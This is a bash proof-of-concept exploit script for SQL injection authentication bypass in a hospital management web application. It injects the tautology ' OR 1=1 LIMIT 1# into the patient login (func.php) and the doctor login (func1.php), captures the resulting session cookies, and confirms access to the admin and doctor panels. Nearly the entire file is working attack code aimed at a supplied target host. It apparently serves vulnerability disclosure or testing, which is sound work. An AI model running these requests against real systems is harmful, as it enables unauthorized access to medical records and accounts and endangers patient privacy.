#!/usr/bin/env bash
# Hospital-Management-System SQL Injection Authentication Bypass - PoC
# Package: hms-auth-bypass (HMS-04 patient login, HMS-05 doctor login)
# Targets: POST /func.php (patsub=1), POST /func1.php (docsub1=1)
# Usage: ./poc.sh http://<target-host>[:port]
# Harmless payloads only (' OR 1=1 LIMIT 1# tautology, arbitrary password).

BASE="${1:-http://localhost:8000}"
JAR_PAT=$(mktemp); JAR_DOC=$(mktemp)

echo "[*] Baseline: invalid patient credentials (expect HTTP 200 + invalid-credentials alert)"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=nonexistent@x.c" \
  --data-urlencode "password2=wrong"

echo "[*] HMS-04: patient login bypass"
curl -s -c "$JAR_PAT" -o /dev/null -w '    status=%{http_code} redirect=%{redirect_url}\n' -X POST "$BASE/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=' OR 1=1 LIMIT 1#" \
  --data-urlencode "password2=x"
# expect: status=302 redirect=.../admin-panel.php
echo "[*] Session proof: GET /admin-panel.php with bypass session (expect welcome banner, pid=1)"
curl -s -b "$JAR_PAT" "$BASE/admin-panel.php" | grep -aoE 'Welcome[^<]*' | head -n 1

echo "[*] HMS-05: doctor login bypass"
curl -s -c "$JAR_DOC" -o /dev/null -w '    status=%{http_code} redirect=%{redirect_url}\n' -X POST "$BASE/func1.php" \
  --data-urlencode "docsub1=1" \
  --data-urlencode "username3=' OR 1=1 LIMIT 1#" \
  --data-urlencode "password3=x"
# expect: status=302 redirect=.../doctor-panel.php
echo "[*] Session proof: GET /doctor-panel.php with bypass session (expect doctor dashboard)"
curl -s -b "$JAR_DOC" -o /dev/null -w '    status=%{http_code} bytes=%{size_download}\n' "$BASE/doctor-panel.php"

rm -f "$JAR_PAT" "$JAR_DOC"
